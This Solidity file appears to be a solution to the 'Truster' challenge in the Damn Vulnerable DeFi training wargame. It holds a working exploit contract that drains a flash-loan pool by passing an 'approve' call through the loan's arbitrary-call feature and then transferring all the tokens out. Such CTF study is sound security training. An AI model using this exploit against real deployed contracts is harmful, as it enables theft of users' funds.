// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

contract TrusterAttacker {
    TrusterLenderPool pool;
    IERC20 public immutable damnValuableToken;

    constructor(address payable poolAddress, address tokenAddress) {
        pool = TrusterLenderPool(poolAddress);
        damnValuableToken = IERC20(tokenAddress);
    }

    function attack() public {
        uint256 TOKENS_IN_POOL = damnValuableToken.balanceOf(address(pool));

        // this grants permission to the attacker to spend tokens on behalf of the lender (flash loan contract)
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);

        //  take a flash loan of 0 tokens (such that no repayment is required) 
        // target becomes the damnValuableToken address
        pool.flashLoan(0, msg.sender, address(damnValuableToken), data);

        // once the attacker has approval of the tokens, 
        // transfer all the tokens to the EOA who calls the function 
        damnValuableToken.transferFrom(address(pool), msg.sender, TOKENS_IN_POOL);
    }
}
